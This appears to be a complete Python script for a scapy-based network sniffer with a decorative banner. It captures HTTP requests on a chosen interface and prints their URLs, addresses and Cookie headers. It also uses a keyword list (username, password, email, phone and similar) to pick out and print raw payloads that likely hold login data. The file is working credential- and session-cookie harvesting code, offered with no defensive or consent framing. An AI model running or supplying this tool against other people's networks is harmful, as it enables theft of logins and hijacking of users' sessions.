import scapy.all                                                                     as scapy
from scapy.layers                                                                    import http
from argparse                                                                        import ArgumentParser
from shutil                                                                          import get_terminal_size
from colorama                                                                        import Fore, init
from os                                                                              import system
from sys                                                                             import stdout

init()

def get_args():
    parser = ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Interface Name (ex: Wi-Fi, eth0, etc.)')
    options = parser.parse_args()
    if not options.interface:
        parser.error('Please specify the name of the interface, use --help for more info.')
    return options.interface

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    width = get_terminal_size().columns
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        ip_src = packet[scapy.IP].src
        ip_dst = packet[scapy.IP].dst
        cookies = safe_decode(packet[http.HTTPRequest], "Cookie")
        print(f"\033[0m\033[43m\033[30m HTTP \033[30m {url} \033[30m {ip_src} → {ip_dst} " + 
              " " * (width - len(url) - len(ip_src) - len(ip_dst) - 20) + "\033[0m")
        cred = get_credentials(packet)
        if cred:
            print(f"\033[0m\033[41m\033[30m {url} \033[37m {cred} → {cookies} " + 
                  " " * (width - len(url) - len(cred) - len(cookies) - 20) + "\033[0m")
    elif packet.haslayer(scapy.IP):
        ip_layer = packet[scapy.IP]
        if ip_layer.haslayer(scapy.TCP):
            if ip_layer.dport == 443 or ip_layer.sport == 443:
                print(f"\033[0m\033[47m\033[30m HTTPS \033[30m {ip_layer.src} → {ip_layer.dst} " + 
                    " " * (width - len(ip_layer.src) - len(ip_layer.dst) - 20) + "\033[0m")
    
def get_url(packet):
    try:
        return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')
    except AttributeError:
        return "UNKNOWN"

keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name', 'email', 'phone', 'uid', 'passw', 'passContainer')

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        try:
            field_load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            if any(keyword in field_load for keyword in keywords):
                return field_load
        except UnicodeDecodeError:
            return None

def safe_decode(layer, field, default=""):
    value = getattr(layer, field, None)
    return value.decode(errors='ignore') if value else default

def title():
    system('clear || cls')
    stdout.write(f'{Fore.LIGHTWHITE_EX}         ▄▄▄▄▄▄▄▄\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}        ▄████████████\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}      ▄██   ████▀▀████\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}  ▐▄ ▐███▄ ▄███▌   ███▌▄██\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}   █▌████████████▄███████▌ {Fore.LIGHTCYAN_EX}  ▄█████████▄\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}   █████████ ▐██████████▀  {Fore.LIGHTCYAN_EX}▄█████████████▌\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}     ██████████████████    {Fore.LIGHTCYAN_EX}█████████▀  ██\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}      ████████████████    {Fore.LIGHTCYAN_EX} ██████████▄\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}       ▀██████████████     {Fore.LIGHTCYAN_EX} ▀████████████▄\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}         ▀█████████████▄  {Fore.LIGHTCYAN_EX}  ▄▄ ▀▀█████████ ███  █▌ █▌ ▐█▀▀  █▀▀▀ ██▀▀  █▀▀█▌\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}            ▀▀▀██████████ {Fore.LIGHTCYAN_EX} ███████████████ █▌ █▄█▌ █▌ ▐█▀▀  █▀▀▀ ██▀▀  █▀██\n')
    stdout.write(f'{Fore.LIGHTWHITE_EX}                          {Fore.LIGHTCYAN_EX}▀██████████████▀ █▌  ██▌ █▌ ▐█    █    ██▄▄  █  ▀▌{Fore.LIGHTWHITE_EX}\n\n')

if __name__ == "__main__":
    title()
    interface = get_args()
    sniffer(interface)
